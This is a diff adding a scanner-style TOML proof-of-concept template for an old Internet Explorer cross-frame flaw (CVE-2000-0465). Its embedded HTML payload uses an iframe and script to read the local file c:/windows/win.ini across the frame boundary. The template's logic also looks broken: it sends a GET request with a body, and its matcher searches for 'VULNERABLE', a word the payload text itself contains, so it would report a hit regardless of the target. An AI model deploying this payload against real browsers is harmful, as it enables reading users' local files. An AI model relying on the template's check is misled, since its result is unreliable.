@@ -1,0 +1,46 @@
+[info]
+author = "ave"
+description = "通过构造恶意 HTML 页面，利用 Internet Explorer 4.x/5.x 的 DocumentComplete 事件跨框架访问漏洞，验证目标浏览器是否存在框架域验证缺陷。攻击者可在恶意页面中嵌入隐藏框架，绕过同源策略读取客户端本地文件。"
+id = "POC-AVE-2000-0387"
+name = "Microsoft Internet Explorer 跨框架域验证漏洞 PoC"
+severity = "medium"
+tags = ["ave-2000-0387"]
+vuln_id = [
+    "CVE-2000-0465",
+    "AVE-2000-0387",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/poc.html"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+<html>
+<body>
+<iframe id="victim" src="file:///c:/windows/win.ini" onload="readFrame()"></iframe>
+<script>
+function readFrame() {
+  try {
+    var content = document.getElementById('victim').contentDocument.body.innerText;
+    if (content.indexOf('[fonts]') > -1 || content.indexOf('for 16-bit') > -1) {
+      document.title = 'VULNERABLE: ' + content.substring(0,100);
+    }
+  } catch(e) {
+    document.title = 'NOT_VULNERABLE';
+  }
+}
+</script>
+</body>
+</html>"""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["VULNERABLE"]
